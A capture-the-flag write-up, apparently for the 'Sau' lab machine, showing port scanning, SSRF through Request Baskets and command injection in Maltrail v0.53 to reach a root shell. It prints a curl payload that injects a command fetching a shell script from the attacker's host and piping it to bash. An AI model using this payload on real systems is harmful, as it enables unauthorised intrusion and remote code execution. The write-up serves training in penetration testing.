# Sau

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 10.129.22.88       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 13:15 +08
Nmap scan report for 10.129.22.88
Host is up (0.24s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
```

Port 80 is being filtered, while port 55555 is open.&#x20;

### Request Baskets SSRF -> Mailtrail RCE

Port 55555 hosted an application that is able to collect and inspect HTTP requests:

<figure><img src="../../.gitbook/assets/image (3310).png" alt=""><figcaption></figcaption></figure>

We can create one by clicking on create:

<figure><img src="../../.gitbook/assets/image (1199).png" alt=""><figcaption></figcaption></figure>

Tihs acts similar to a webhook, and is able to retrieve requests sent to that unique URL.

<figure><img src="../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>

We are able to set the Responses from the website. as well as where the traffic is being forwarded to, just like we can with Webhooks. Setting the Forward URL to our own HTTP server results in requests being sent there from the machine.

<figure><img src="../../.gitbook/assets/image (1194).png" alt=""><figcaption></figcaption></figure>

Since port 80 was being filtered, we can set it to `http://localhost` and try setting all the options to True. Afterwards, sending GET requests to our bucket would result in HTML being returned:

```
$ curl http://10.129.22.88:55555/test
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
<TRUNCATED>
<div class="bottom noselect">Powered by <b>M</b>altrail (v<b>0.53</b>)</div>
```

At the bottom, we can see that port 80 has Mailtrail v0.53 running, which is vulnerable to an unauthenticated RCE exploit.

{% embed url="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/" %}

To exploit this, we just need to change the forward URL to `http://127.0.0.1/login` and send a POST request via `curl` with a payload like this:

{% code overflow="wrap" %}
```bash
$ curl -X POST --data 'username=;`curl 10.10.14.31/shell.sh|bash`' http://10.129.22.88:55555/test
```
{% endcode %}

We would get a reverse shell as `puma`:

<figure><img src="../../.gitbook/assets/image (2380).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Sudo Systemctl -> Root

The user is able to run a command using `sudo`:

```
puma@sau:/opt/maltrail$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

This is easily exploitable to get a `root` shell:

<figure><img src="../../.gitbook/assets/image (1460).png" alt=""><figcaption></figcaption></figure>

Rooted!
